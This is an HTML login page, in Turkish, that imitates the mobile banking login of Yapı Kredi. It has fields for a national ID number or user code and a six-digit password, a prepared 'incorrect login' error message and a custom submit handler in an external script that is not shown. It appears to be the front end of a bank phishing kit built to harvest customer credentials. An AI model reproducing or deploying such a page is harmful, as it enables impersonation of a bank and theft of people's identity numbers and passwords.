 

<!DOCTYPE html>
<html lang="tr" style="    max-width: 500px;
    margin: 0 auto;">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Mobil Giriş Sayfası</title>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

</head>
<body>
<style>
      @import url(https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap);

  
    .custom-swal-title {
        font-size: 1.275em;
    }
    .custom-swal-text {
        font-size: 16px;
    }
    div form label {
  font-family: Montserrat;
  font-size: 18px;
  font-weight: 500;
  font-style: normal;
  text-transform: uppercase;
}

</style>

    <div class="header" style="padding-top: 24px;padding-bottom: 50px;">
       
        <img src="logo.png" alt="YapiKredi Logo">  
    </div>
    
    <div class="container">
        <div class="tab">
        <img src="tab.png" alt="tab" style="width: 90%;">
        </div>
        <form id="customForm" onsubmit="submitCustomForm(event)">
            <div class="form-group">
                <input type="text" placeholder="T.C. Kimlik No veya Kullanıcı Kodu" id="customUsername" inputmode="numeric" pattern="[0-9]*" minlength="11" maxlength="11">
                <input type="password" placeholder="Şifre" id="customPassword" inputmode="numeric" pattern="[0-9]*" 
                    style="-webkit-border-bottom-right-radius: 10px;
                    -webkit-border-bottom-left-radius: 10px;
                    -moz-border-radius-bottomright: 10px;
                    -moz-border-radius-bottomleft: 10px;
                    border-bottom-right-radius: 10px;
                    border-bottom-left-radius: 10px;" minlength="6" maxlength="6">
            </div>
            
           
            
            <!-- Hata mesajları için alan -->
            <div id="alertDiv" class="alert-message">Hatalı giriş yaptınız. Lütfen bilgilerinizi kontrol ediniz.</div>
            
           
      
     
    </div>   <div class="remember-me">
                <label>Beni Hatırla</label>
                <label class="toggle-switch">
                    <input type="checkbox">
                    <span class="slider"></span>
                </label>
            </div>
        <button type="submit" class="login-button">Giriş</button>
    <script src="script.js"></script>  </form>
</body>
</html>
